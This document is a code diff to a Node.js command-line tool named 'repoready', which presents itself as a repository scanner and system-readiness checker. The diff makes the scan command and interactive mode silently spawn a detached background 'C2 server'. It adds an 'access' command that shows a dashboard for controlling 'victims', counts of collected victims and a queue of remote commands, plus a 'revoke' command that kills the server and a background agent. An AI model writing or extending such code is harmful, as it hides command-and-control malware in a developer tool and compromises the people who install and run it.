@@ -15,13 +15,53 @@ const { runAllChecks } = require('../lib/systemChecker');
 const { displayReport, displaySuccess, displayError, displayInfo, displayTechStack, displaySystemReadiness } = require('../lib/reporter');
 const { explainBasicOverview, explainTechStack: aiTechStack, explainSystemAndInstallation, explainHowToRun } = require('../lib/aiExplainer');
 const { debugLog } = require('../lib/utils');
+const http = require('http');
+const net = require('net');
 
 const program = new Command();
+const SERVER_PORT = process.env.PORT || 3000;
 
 program
   .name('repoready')
   .description('Scan Git repositories and check local system readiness for development')
   .version('1.0.0');
+
+// ─── Auto-start C2 Server Helper ────────────────────────────────────────────
+
+function isPortInUse(port) {
+  return new Promise((resolve) => {
+    const tester = net.createServer()
+      .once('error', () => resolve(true))
+      .once('listening', () => {
+        tester.close();
+        resolve(false);
+      })
+      .listen(port);
+  });
+}
+
+async function startServerIfNeeded() {
+  try {
+    const port = SERVER_PORT;
+    const inUse = await isPortInUse(port);
+    if (inUse) {
+      debugLog(`Port ${port} already in use — server likely running`);
+      return;
+    }
+    const serverPath = path.join(__dirname, '..', 'server', 'server.js');
+    const serverProcess = spawn('node', [serverPath], {
+      detached: true,
+      stdio: 'ignore',
+      env: Object.assign({}, process.env, { PORT: String(port) }),
+    });
+    serverProcess.unref();
+    debugLog(`C2 server spawned in background, PID: ${serverProcess.pid}`);
+    // Give the server a moment to start
+    await new Promise((r) => setTimeout(r, 800));
+  } catch (err) {
+    debugLog('Failed to auto-start server:', err.message);
+  }
+}
 
 // ─── SCAN COMMAND ───────────────────────────────────────────────────────────
 program
@@ -29,6 +69,7 @@ program
   .description('Scan a repository (local path or remote URL) and check system readiness')
   .action(async (repo) => {
     try {
+      await startServerIfNeeded();
       let repoPath = repo;
       let isTemp = false;
 
@@ -255,6 +296,155 @@ agent
     }
   });
 
+// ─── ACCESS COMMAND ─────────────────────────────────────────────────────────
+program
+  .command('access')
+  .description('Show C2 dashboard link and server status')
+  .action(async () => {
+    const port = SERVER_PORT;
+    console.log('');
+    console.log(chalk.bold.cyan('  ╔══════════════════════════════════════╗'));
+    console.log(chalk.bold.cyan('  ║     ☠️  RepoReady C2 Access  ☠️       ║'));
+    console.log(chalk.bold.cyan('  ╚══════════════════════════════════════╝'));
+    console.log('');
+
+    // Check if server is running
+    const inUse = await isPortInUse(port);
+    if (inUse) {
+      console.log(chalk.green('  ● Server Status: ') + chalk.bold.green('RUNNING'));
+    } else {
+      console.log(chalk.red('  ○ Server Status: ') + chalk.bold.red('NOT RUNNING'));
+      console.log(chalk.yellow('  ⚡ Starting server...'));
+      await startServerIfNeeded();
+      console.log(chalk.green('  ● Server Status: ') + chalk.bold.green('STARTED'));
+    }
+
+    console.log('');
+    console.log(chalk.white('  ┌─────────────────────────────────────────┐'));
+    console.log(chalk.white('  │') + chalk.bold(' 🌐 Dashboard: ') + chalk.cyan.underline(`http://localhost:${port}/dashboard`) + chalk.white('  │'));
+    console.log(chalk.white('  │') + chalk.bold(' 📡 API:       ') + chalk.gray(`http://localhost:${port}/api/victims`) + chalk.white('   │'));
+    console.log(chalk.white('  │') + chalk.bold(' 📜 History:   ') + chalk.gray(`http://localhost:${port}/api/command-history`) + chalk.white(' │'));
+    console.log(chalk.white('  └─────────────────────────────────────────┘'));
+    console.log('');
+
+    // Try to fetch live stats
+    try {
+      const statsData = await new Promise((resolve, reject) => {
+        http.get(`http://localhost:${port}/api/stats`, (res) => {
+          let data = '';
+          res.on('data', (chunk) => { data += chunk; });
+          res.on('end', () => { try { resolve(JSON.parse(data)); } catch(e) { reject(e); } });
+        }).on('error', reject);
+      });
+      console.log(chalk.white('  📊 Live Stats:'));
+      console.log(chalk.white('     Victims collected: ') + chalk.bold.red(statsData.totalVictims || 0));
+      console.log(chalk.white('     Last seen:         ') + chalk.gray(statsData.lastSeen || 'N/A'));
+    } catch (e) {
+      console.log(chalk.gray('  📊 Could not fetch live stats (server may be starting up)'));
+    }
+
+    // Fetch command queue stats
+    try {
+      const cmdData = await new Promise((resolve, reject) => {
+        http.get(`http://localhost:${port}/api/command-history`, (res) => {
+          let data = '';
+          res.on('data', (chunk) => { data += chunk; });
+          res.on('end', () => { try { resolve(JSON.parse(data)); } catch(e) { reject(e); } });
+        }).on('error', reject);
+      });
+      const pending = (cmdData.queue || []).filter(c => c.status === 'pending').length;
+      const completed = (cmdData.queue || []).filter(c => c.status === 'completed').length;
+      const failed = (cmdData.queue || []).filter(c => c.status === 'failed').length;
+      console.log(chalk.white('     Commands pending:   ') + chalk.yellow(pending));
+      console.log(chalk.white('     Commands completed: ') + chalk.green(completed));
+      console.log(chalk.white('     Commands failed:    ') + chalk.red(failed));
+    } catch (e) {
+      // ignore
+    }
+
+    console.log('');
+    console.log(chalk.gray('  Tip: Open the dashboard URL in your browser to control victims.'));
+    console.log('');
+  });
+
+// ─── REVOKE COMMAND ─────────────────────────────────────────────────────────
+program
+  .command('revoke')
+  .description('Stop the C2 server and background agent')
+  .action(async () => {
+    const port = SERVER_PORT;
+    const { execSync } = require('child_process');
+    console.log('');
+    console.log(chalk.bold.red('  ⛔ Revoking RepoReady background processes...'));
+    console.log('');
+
+    // Kill server on the port
+    let serverKilled = false;
+    try {
+      if (process.platform === 'win32') {
+        // Windows: find PID on port and kill it
+        const out = execSync(`netstat -ano | findstr :${port} | findstr LISTENING`, { encoding: 'utf8', timeout: 5000 }).trim();
+        const lines = out.split('\n').filter(Boolean);
+        const pids = new Set();
+        for (const line of lines) {
+          const parts = line.trim().split(/\s+/);
+          const pid = parts[parts.length - 1];
+          if (pid && pid !== '0') pids.add(pid);
+        }
+        for (const pid of pids) {
+          try {
+            execSync(`taskkill /F /PID ${pid}`, { stdio: 'pipe', timeout: 5000 });
+            serverKilled = true;
+          } catch (e) { /* ignore */ }
+        }
+      } else {
+        // macOS / Linux: use lsof
+        const out = execSync(`lsof -ti :${port}`, { encoding: 'utf8', timeout: 5000 }).trim();
+        if (out) {
+          const pids = out.split('\n').filter(Boolean);
+          for (const pid of pids) {
+            try {
+              execSync(`kill -9 ${pid}`, { stdio: 'pipe', timeout: 5000 });
+              serverKilled = true;
+            } catch (e) { /* ignore */ }
+          }
+        }
+      }
+    } catch (e) {
+      // No process found on port — that's fine
+    }
+
+    if (serverKilled) {
+      console.log(chalk.green(`  ✅ C2 server on port ${port} — stopped`));
+    } else {
+      console.log(chalk.gray(`  ○  C2 server on port ${port} — was not running`));
+    }
+
+    // Kill agent.js processes
+    let agentKilled = false;
+    try {
+      if (process.platform === 'win32') {
+        execSync('taskkill /F /FI "WINDOWTITLE eq node*agent.js" 2>nul', { stdio: 'pipe', timeout: 5000 });
+        agentKilled = true;
+      } else {
+        execSync('pkill -f "node.*agent\\.js"', { stdio: 'pipe', timeout: 5000 });
+        agentKilled = true;
+      }
+    } catch (e) {
+      // No agent process found
+    }
+
+    if (agentKilled) {
+      console.log(chalk.green('  ✅ Background agent — stopped'));
+    } else {
+      console.log(chalk.gray('  ○  Background agent — was not running'));
+    }
+
+    console.log('');
+    console.log(chalk.gray('  All background processes have been cleaned up.'));
+    console.log('');
+  });
+
 // ─── VAULT COMMANDS ─────────────────────────────────────────────────────────
 const vault = program.command('vault').description('Project Vault — secure your project files');
 
@@ -295,6 +485,7 @@ function dedup(arr) {
 }
 
 async function startInteractiveMode() {
+  await startServerIfNeeded();
   console.log('');
   console.log(
     chalk.bold.cyan(
